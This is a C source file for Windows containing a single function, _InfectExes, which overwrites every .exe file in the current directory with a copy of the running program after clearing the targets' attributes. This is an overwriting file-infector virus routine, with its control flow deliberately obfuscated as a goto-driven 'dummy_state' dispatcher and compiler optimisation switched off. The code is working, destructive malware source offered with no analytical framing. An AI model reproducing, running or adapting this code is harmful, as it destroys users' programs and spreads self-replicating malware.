#include "data_globals.h"
#include <windows.h>
#include <stdint.h>

#pragma optimize("", off)
uint32_t _InfectExes(void)
{
    uint32_t result;
    BOOL success;
    char current_exe_path[256];
    WIN32_FIND_DATAA file_data;
    HANDLE find_handle;
    volatile int dummy_state = 1;

dummy_dispatcher:
    if (dummy_state == 1) goto dummy_state_1;
    if (dummy_state == 2) goto dummy_state_2;
    if (dummy_state == 3) goto dummy_state_3;
    if (dummy_state == 4) goto dummy_state_4;
    if (dummy_state == 5) goto dummy_state_5;
    if (dummy_state == 6) goto dummy_state_6;
    if (dummy_state == 0) goto dummy_end;

dummy_state_1:
    GetModuleFileNameA(NULL, current_exe_path, sizeof(current_exe_path));
    find_handle = FindFirstFileA("*.exe", &file_data);
    dummy_state = 2;
    goto dummy_dispatcher;

dummy_state_2:
    if (find_handle == INVALID_HANDLE_VALUE)
    {
        dummy_state = 3;
    }
    else
    {
        dummy_state = 4;
    }
    goto dummy_dispatcher;

dummy_state_3:
    result = 1;
    dummy_state = 0;
    goto dummy_dispatcher;

dummy_state_4:
    SetFileAttributesA(file_data.cFileName, FILE_ATTRIBUTE_NORMAL);
    CopyFileA(current_exe_path, file_data.cFileName, FALSE);
    dummy_state = 5;
    goto dummy_dispatcher;

dummy_state_5:
    success = FindNextFileA(find_handle, &file_data);
    if (success == 0)
    {
        dummy_state = 6;
    }
    else
    {
        SetFileAttributesA(file_data.cFileName, FILE_ATTRIBUTE_NORMAL);
        CopyFileA(current_exe_path, file_data.cFileName, FALSE);
        dummy_state = 5;
    }
    goto dummy_dispatcher;

dummy_state_6:
    FindClose(find_handle);
    result = 0;
    dummy_state = 0;
    goto dummy_dispatcher;

dummy_end:
    return result;
}
#pragma optimize("", on)
